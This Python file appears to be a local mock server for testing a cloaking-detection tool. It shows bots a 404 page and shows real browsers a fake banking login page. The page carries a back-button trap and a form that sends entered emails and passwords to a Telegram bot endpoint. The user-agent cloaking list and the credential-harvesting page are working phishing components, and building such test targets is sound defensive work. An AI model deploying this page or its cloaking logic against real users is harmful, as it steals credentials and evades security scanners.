"""
Module 5A: Local Test Harness & Cloaking Mock Server
Configured to serve benign 404 errors to automated bots/scrapers (Persona A)
and a fully-formed credential-harvesting payload to real desktop browsers (Persona B).
"""

from fastapi import FastAPI, Request, Response
from fastapi.responses import HTMLResponse, JSONResponse
import uvicorn
from config.settings import settings

mock_app = FastAPI(title="CloakBuster Local Mock Cloaking Target")

@mock_app.get("/", response_class=HTMLResponse)
@mock_app.get("/login", response_class=HTMLResponse)
async def cloaked_endpoint(request: Request):
    user_agent = request.headers.get("user-agent", "").lower()
    
    # Detect Bot / Persona A scraper
    is_bot = any(b in user_agent for b in ["python-requests", "httpx", "curl", "wget", "bot", "crawler", "cloakbuster-bot"])

    if is_bot:
        # Return 404 Not Found to Bot / Scraper
        html_404 = """
        <!DOCTYPE html>
        <html>
        <head><title>404 Not Found</title></head>
        <body>
            <h1>404 Not Found</h1>
            <p>The requested URL was not found on this server.</p>
        </body>
        </html>
        """
        return HTMLResponse(content=html_404, status_code=404)

    # Return Full Credential Harvesting Payload to Real Desktop Browser (Persona B)
    phishing_payload_html = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Secure Banking Portal - Sign In</title>
        <style>
            body { font-family: Arial, sans-serif; background-color: #f4f6f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
            .login-card { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 360px; text-align: center; }
            .login-card h2 { margin-bottom: 20px; color: #1a73e8; }
            .input-group { margin-bottom: 15px; text-align: left; }
            .input-group label { display: block; font-size: 14px; margin-bottom: 5px; color: #555; }
            .input-group input { width: 100%; padding: 10px; box-sizing: border-box; border: 1px solid #ccc; border-radius: 4px; }
            .btn-submit { background-color: #1a73e8; color: white; border: none; padding: 12px; width: 100%; border-radius: 4px; font-weight: bold; cursor: pointer; }
            .btn-submit:hover { background-color: #1557b0; }
        </style>
        <script>
            // Anti-Exit / Back-Button Trap Mechanism
            history.pushState(null, null, location.href);
            window.onpopstate = function () {
                history.pushState(null, null, location.href);
                alert("Security Alert: Session locked. Please enter your credentials to exit.");
            };
        </script>
    </head>
    <body>
        <div class="login-card">
            <h2>Account Security Verification</h2>
            <p style="font-size: 13px; color: #777;">Please re-authenticate to verify your identity.</p>
            
            <!-- Third-Party Telegram Exfiltration Endpoint -->
            <form action="https://api.telegram.org/bot123456789:ABCdefGHIjklMNOpqrSTUvwxYZ/sendMessage" method="POST">
                <div class="input-group">
                    <label for="username">Email Address / User ID</label>
                    <input type="email" id="username" name="username" placeholder="user@domain.com" required>
                </div>
                <div class="input-group">
                    <label for="password">Account Password</label>
                    <input type="password" id="password" name="password" placeholder="••••••••" required>
                </div>
                <button type="submit" class="btn-submit">Sign In to Account</button>
            </form>
        </div>
    </body>
    </html>
    """
    return HTMLResponse(content=phishing_payload_html, status_code=200)

def start_mock_server():
    print(f"Starting CloakBuster Mock Cloaking Target on http://{settings.API_HOST}:{settings.MOCK_SERVER_PORT}")
    uvicorn.run(mock_app, host=settings.API_HOST, port=settings.MOCK_SERVER_PORT)

if __name__ == "__main__":
    start_mock_server()
